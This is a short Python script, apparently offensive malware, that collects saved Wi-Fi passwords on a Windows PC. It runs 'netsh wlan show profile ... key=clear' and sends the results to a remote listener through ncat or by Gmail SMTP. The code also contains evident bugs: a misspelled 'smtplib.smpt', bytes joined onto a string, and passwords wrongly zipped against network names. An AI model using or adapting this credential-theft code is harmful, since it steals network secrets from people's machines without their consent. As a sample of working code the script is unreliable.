#!/usr/bin/python3
"""
win_wifi_steal.py - Windows wifi pass steal

With this script you can obtain the wifi pass from the remote Windows PC.
"""

import re
import smtplib
import subprocess
from webbrowser import get


def get_list_of_networks():
    """ Find the list of networks and return them """
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    networks_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

    return networks_list


def find_passwords(networks_list):
    """ Find the password for the list of networks provided. """
    # Initialize the output
    output = ""

    # Run the command for all the networks found
    for network in networks_list:
        command = f"netsh wlan show profile {network} key=clear"
        result = subprocess.check_output(command, shell=True)
        output += result
        
    return output 

def send_email(email, password, message):

    # Send an email with the output
    server = smtplib.smpt("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def send_passwords_using_netcat(result, ip, port):
    """ Send the passwords using netcat """
    for network, password in result:
        command = f"echo {network}:{password} | ncat.exe {ip} {port}"
        subprocess.check_output(command, shell=True)

def main():
    # Retrieve the list of networks
    networks_list = get_list_of_networks()

    # Find the passwords
    passwords = find_passwords(networks_list)
    
    # Send the passwords using netcat
    result = zip(networks_list, passwords)
    send_passwords_using_netcat(result, "localhost", "4444")

if '__main__' == __name__:
    main()
